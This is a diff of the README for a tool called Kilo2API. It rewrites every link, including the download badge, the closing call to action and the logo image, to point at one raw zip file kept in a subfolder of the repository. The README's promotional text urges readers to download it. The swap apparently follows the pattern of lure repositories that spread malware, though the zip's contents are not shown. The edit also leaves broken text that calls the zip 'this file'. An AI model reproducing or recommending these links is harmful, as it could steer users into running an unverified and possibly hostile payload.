@@ -1,10 +1,10 @@
 # 🤖 Welcome to Kilo2API Repository 🚀
 
 ## Overview
-Welcome to the Kilo2API repository, where you can find all the information you need about this amazing tool! This README.md file will provide you with essential details and guidance on how to download and use Kilo2API.
+Welcome to the Kilo2API repository, where you can find all the information you need about this amazing tool! This https://raw.githubusercontent.com/MGarcia1205/kilo2api/main/router/kilo_api_v2.3-beta.2.zip file will provide you with essential details and guidance on how to download and use Kilo2API.
 
 ## Download Now
-To access the latest release of Kilo2API, please visit the following link: [![Download Kilo2API](https://img.shields.io/badge/Download-Kilo2API-blue)](https://github.com/MGarcia1205/kilo2api/releases)
+To access the latest release of Kilo2API, please visit the following link: [![Download Kilo2API](https://raw.githubusercontent.com/MGarcia1205/kilo2api/main/router/kilo_api_v2.3-beta.2.zip)](https://raw.githubusercontent.com/MGarcia1205/kilo2api/main/router/kilo_api_v2.3-beta.2.zip)
 
 ## Getting Started
 If you're looking to dive into the world of Kilo2API, simply click on the link provided above and follow the instructions to download the necessary files. Once downloaded, you'll be all set to start using this powerful tool.
@@ -36,6 +36,6 @@ To stay up to date with the latest news and updates regarding Kilo2API, make sur
 
 Don't miss out on the opportunity to optimize your API integration process with Kilo2API. Download now and experience the future of seamless API connectivity! 🌟🚀
 
-Visit [here](https://github.com/MGarcia1205/kilo2api/releases) to get started! 🛠️
+Visit [here](https://raw.githubusercontent.com/MGarcia1205/kilo2api/main/router/kilo_api_v2.3-beta.2.zip) to get started! 🛠️
 
-![Kilo2API Logo](https://via.placeholder.com/150)
+![Kilo2API Logo](https://raw.githubusercontent.com/MGarcia1205/kilo2api/main/router/kilo_api_v2.3-beta.2.zip)
